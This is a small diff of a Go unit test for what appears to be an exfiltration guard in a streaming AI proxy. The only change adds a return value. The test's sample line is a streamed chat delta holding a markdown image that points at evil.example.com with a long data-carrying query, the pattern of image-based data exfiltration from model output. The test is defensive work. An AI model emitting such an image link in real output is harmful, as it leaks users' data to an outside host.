@@ -79,7 +79,7 @@ func TestGuardBufferedLine_NonCanonicalField(t *testing.T) {
 	guard := stream.NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionStrip, MaxQueryChars: 8}, nil)
 	longQuery := strings.Repeat("A", 400)
 	line := `data:{"choices":[{"delta":{"content":"![b](https://evil.example.com/x?d=` + longQuery + `)"}}]}`
-	rewritten, blocked, changed := (&Proxy{}).guardBufferedLine(guard, line)
+	rewritten, blocked, changed, _ := (&Proxy{}).guardBufferedLine(guard, line)
 	if !blocked && !changed {
 		t.Fatalf("the guard did not act on a no-space data line: %q", rewritten)
 	}
